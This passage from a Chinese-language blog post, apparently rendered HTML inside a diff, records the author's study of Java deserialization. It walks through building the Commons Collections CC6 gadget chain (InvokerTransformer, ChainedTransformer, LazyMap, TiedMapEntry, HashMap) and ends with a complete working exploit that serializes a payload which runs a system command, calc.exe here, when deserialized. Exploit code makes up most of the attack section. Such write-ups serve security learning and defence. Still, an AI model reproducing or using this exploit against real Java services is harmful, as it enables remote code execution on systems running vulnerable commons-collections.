true);</span><br><span class="line">        InputStream inputStream = e.getInputStream();</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        int len = 0;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        while ((len = inputStream.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><p>echo 命令</p>
+<p>由于系统环境变量找不到 echo 执行文件，所以使用 cmd 命令进行 echo 的使用</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120154850113.png" class title="image-20250120154850113">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120155000076.png" class title="image-20250120155000076">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InputStream is = Runtime.getRuntime().exec(&quot;cmd /c echo 123&quot;).getInputStream();</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        int len = 0;</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        while ((len = is.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120154945960.png" class title="image-20250120154945960">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120155029208.png" class title="image-20250120155029208">
+
+
+
+<h2 id="CC-链"><a href="#CC-链" class="headerlink" title="CC 链"></a>CC 链</h2><h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p>CC6 链是 Commons Collections 反序列化漏洞 中影响范围最广的一条利用链，它仅受 Commons Collections 版本的影响，不受 Java 版本的限制。</p>
+<p>受影响的 Commons Collections 范围：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections：3.1 - 3.2.1</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250124155043383.png" class title="image-20250124155043383">
+
+<p>本次漏洞分析环境采用 commons-collections 3.2.1 版本</p>
+<h4 id="HashMap-版利用链"><a href="#HashMap-版利用链" class="headerlink" title="HashMap 版利用链"></a>HashMap 版利用链</h4><p>要实现反序列化命令执行，最基础的思路是通过 Runtime.exec() 触发计算器：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>但我们不能直接调用 exec()，因此需要在 commons-collections 依赖中找到一个可利用的调用链来在反序列化时触发这个命令。</p>
+<p><strong>Sink：</strong> </p>
+<p>在 InvokerTransformer#transform 中有反射调用代码段，并且参数都是可控的</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125094426756.png" class title="image-20250125094426756">
+
+<p>当 input 赋为 Runtime 对象并给 cls，cls.getMethod 封装 Runtime#exec 类方法元信息，再给 iArgs 赋为系统命令，此时调用 transform，能够达成上面的 “目标实现”</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125093229585.png" class title="image-20250125093229585">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125110812768.png" class title="image-20250125110812768">
+
+<p><strong>Gadget：</strong></p>
+<p>在明确了 InvokerTransformer#transform 方法的功能及其可用于命令执行的特性后，接下来的重点是分析调用链，即寻找哪些类能够直接或间接地调用 transform 方法</p>
+<p>使用 IDEA 的 Find Usages 功能，搜索所有调用 transform 方法的代码路径</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125111336136.png" class title="image-20250125111336136">
+
+<p>ChainedTransformer#transform 方法将 iTransformers 数组循环取出去调用数组内对象的 transform 方法，并将前一个方法返回结果作为调用数组下一对象的 object 参数，循环链式调用。</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125111552859.png" class title="image-20250125111552859">
+
+<p>ConstantTransformer#transform 方法固定返回 iConstant 属性。</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125114807898.png" class title="image-20250125114807898">
+
+<p>iTransformers 数组 与 iConstant 属性都可控，在实例化时赋值。</p>
+<p>我们将 Runtime.getRuntime().exec(“calc.exe”); 改为反射形式</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method method = Runtime.class.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime runtime = (Runtime) method.invoke(null);</span><br><span class="line">runtime.exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>并通过 ChainedTransformer#transform 与 ConstantTransformer#transform 实现上列反射流程，在走到 InvokerTransformer#transform 的 getMethod 方法时仍然需要指定形参类型</p>
+<p>如果不指定，会报以下错误</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125121255215.png" class title="image-20250125121255215">
+
+<p>getMethod 第二个参数 parameterTypes 用来精确匹配目标方法的参数签名，以定位要执行的方法，在反射调用使用 getMethod 时，必须制定好调用类方法的形参类型。Runtime#exec 内部接收的是 String 类型，因此第二个参数传入为 String.class</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125105726508.png" class title="image-20250125105726508">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125105920602.png" class title="image-20250125105920602">
+
+<p>通过反射调用方法传入参数时，即使参数不给值，也需要传入 null</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125213453733.png" class title="image-20250125213453733">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        chainedTransformer.transform(null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125123016834.png" class title="image-20250125123016834">
+
+<p>接下来寻找调用 chainedTransformer#transform，在 LazyMap#get 中存在 factory.transform</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250126094908713.png" class title="image-20250126094908713">
+
+<p>继续追链，TideMapEntry#getValue 中调用了 get 方法</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127181803984.png" class title="image-20250127181803984">
+
+<p>同样在 TideMapEntry 类中，hashCode 去调用了 getValue</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127182333986.png" class title="image-20250127182333986">
+
+<p>需要调用 hashCode 方法，正好 URLDNS 调用链同样是调用 hashCode，直接借用。Java 核心类库 HashMap 类中，hash 方法调用了 hashCode</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127182550220.png" class title="image-20250127182550220">
+
+<p><strong>Source：</strong></p>
+<p>最后 HashMap#readObejct 调用 hash，完成调用链闭环</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127183314270.png" class title="image-20250127183314270">
+
+<p>初步利用链：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        byte[] poc = Serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>只进行序列化，发现序列化时就会触发命令执行</p>
+<p>断点调试，发现是在 hashMap.put 的时候触发的</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129204224611.png" class>
+
+<p>在 URLDNS 链中，URL#hashCode 方法存在 if 判断，通过将 hashCode 属性反射赋值为 -1 绕过了 put 执行，但 TiedMapEntry#hashCode 并没有 if 判断，一旦触发就会直接往后走，该如何绕过呢</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129204852113.png" class title="image-20250129204852113">
+
+<p>解决方案：先让 LazyMap 使用 ConstantTransformer(1) 占位，干扰原始 transform() 的调用时机，再修改 factory 属性为 ChainedTransformer，确保最后执行反序列化时利用链正确。</p>
+<p>执行，发现又出现新的问题，反序列化时也不触发 exec 了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        SetFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        byte[] poc = Serialize(hashMap);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void SetFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>继续断点逐步调试，containsKey(Object key) 用于判断 Map 是否包含指定的 key，如果 key 存在于 Map 中，则返回 true，否则返回 false。显然程序在 LazyMap#get 处没能按照预期进入 if 方法体内</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129212941404.png" class title="image-20250129212941404">
+
+<p>解决方法：去除 LazyMap key 属性</p>
+<p>最终 Exp</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        SetFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        lazyMap.remove(&quot;abc&quot;);</span><br><span class="line">        byte[] poc = Serialize(hashMap);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void SetFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129213348869.png" class title="image-20250129213348869">
+
+<p>Gadget chain：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">	java.util.HashMap.readObject()</span><br><span class="line">        java.util.HashMap.hash()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            	java.lang.reflect.Method.invoke()</span><br><span class="line">                                	java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="HashSet-版利用链"><a href="#HashSet-版利用链" class="headerlink" title="HashSet 版利用链"></a>HashSet 版利用链</h4><p>在 ysoserial 项目 cc6 payload 中，调用链入口是 HashSet，再到 HashMap，其他一致</p>
